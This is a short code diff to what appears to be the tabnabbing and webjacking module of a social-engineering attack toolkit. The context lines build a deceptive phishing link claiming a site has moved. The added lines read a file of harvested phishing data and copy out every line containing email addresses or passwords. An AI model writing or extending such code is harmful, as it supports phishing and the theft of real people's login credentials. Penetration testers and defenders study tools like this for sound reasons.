@@ -2,7 +2,10 @@
 import subprocess
 import re
 import urllib
+
 import os
+import sys
+
 from src.core.setcore import *
 #
 # TabNabbing Source here
@@ -89,3 +92,16 @@ if attack_vector == "webjacking" or multi_webjacking == "on":
     filewrite1.write('''<a href="%s" onclick="t=setTimeout('a()', %s);" target="iframe"><h1>The site %s has moved, click here to go to the new location.</h1></a>\n''' %
                      (URL, webjacking_timing, URL))
     filewrite1.close()
+
+f = open("/usr/share/set/src/webattack/tabnabbing/hackingInfo.txt","r")
+copy = open("/usr/share/set/src/webattack/tabnabbing/hackingCopy.txt","wt")
+
+for line in f:
+    if line.find("email") != -1 :
+        copy.write(line)
+
+    if line.find("pass") != -1 :
+        copy.write(line)
+
+f.close()
+copy.close()
